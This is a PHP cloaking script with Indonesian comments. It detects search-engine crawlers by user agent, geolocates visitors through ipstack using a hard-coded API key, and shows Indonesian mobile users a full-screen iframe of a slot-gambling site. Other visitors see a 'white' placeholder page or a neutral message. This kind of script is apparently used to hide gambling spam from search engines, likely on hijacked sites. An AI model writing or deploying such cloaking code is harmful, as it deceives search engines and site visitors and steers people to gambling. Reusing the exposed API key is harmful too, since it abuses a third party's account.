<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);


$apiKey = '1e6e1da3fe8072428e75204c3d4f44d8';


$cloakingActive = false; // UBAH ON/OFF DISINI


function getGeoLocation($ip, $apiKey) {
    $url = "http://api.ipstack.com/{$ip}?access_key={$apiKey}";
    $response = file_get_contents($url);
    return json_decode($response, true);
}


function isMobileDevice() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $mobileKeywords = ['Android', 'iPhone', 'iPad', 'iPod', 'Windows Phone', 'webOS'];
    foreach ($mobileKeywords as $keyword) {
        if (strpos($userAgent, $keyword) !== false) {
            return true;
        }
    }
    return false;
}


function isBot() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $botList = [
        'Googlebot', 'Bingbot', 'Yahoo!', 'YandexBot', 'Baiduspider',
        'Slurp', 'DuckDuckBot', 'Sogou', 'Exabot', 'facebookexternalhit'
    ];

    foreach ($botList as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}


$ipAddress = $_SERVER['REMOTE_ADDR'];


if ($cloakingActive) {

    if (isBot()) {
        header("Location: /bot-detected.html");
        exit;
    }


    $geoData = getGeoLocation($ipAddress, $apiKey);


    $countryCode = $geoData['country_code'] ?? 'UNKNOWN'; // Kode negara
    $isMobile = isMobileDevice();

    
    if ($countryCode === 'ID' && $isMobile) {
        
        echo '<!DOCTYPE html>
        <html lang="id">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body, html {
                    margin: 0;
                    padding: 0;
                    height: 100%;
                    overflow: hidden;
                }
                iframe {
                    width: 100%;
                    height: 100vh;
                    border: none;
                    position: absolute;
                    top: 0;
                    left: 0;
                }
            </style>
        </head>
        <body>
            <iframe src="https://slotplerkuda.web.app/"></iframe>
        </body>
        </html>';
        exit;
    } elseif ($countryCode !== 'ID' && !$isMobile) {
        
        echo '<!DOCTYPE html>
        <html lang="id">
        <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body, html {
                    margin: 0;
                    padding: 0;
                    height: 100%;
                    overflow: hidden;
                }
                iframe {
                    width: 100%;
                    height: 100vh;
                    border: none;
                    position: absolute;
                    top: 0;
                    left: 0;
                }
            </style>
        </head>
        <body>
            <iframe src="URLPUTIH"></iframe>
        </body>
        </html>';
        exit;
    } else {
        // Default: tampilkan halaman netral
        echo '<h1>Halaman Tidak Tersedia Silahkan Kembali</h1>';
        exit;
    }
} else {
    
    http_response_code(404);
    echo '<h1>404 Not Found</h1>';
    exit;
}
?>

<!-- HTML Frameset -->
<!DOCTYPE html>
<html>
<head>
    <title>TEST</title>
    <meta name="description" content="TEST" />
    <meta name="keywords" content="TEST" />
</head>
<frameset border="0" rows="100%,*" cols="100%" frameborder="no">
    <frame name="TopFrame" scrolling="yes" noresize src="URLHITAM">
    <frame name="BottomFrame" scrolling="no" noresize>
    <noframes></noframes>
</frameset>
</html>
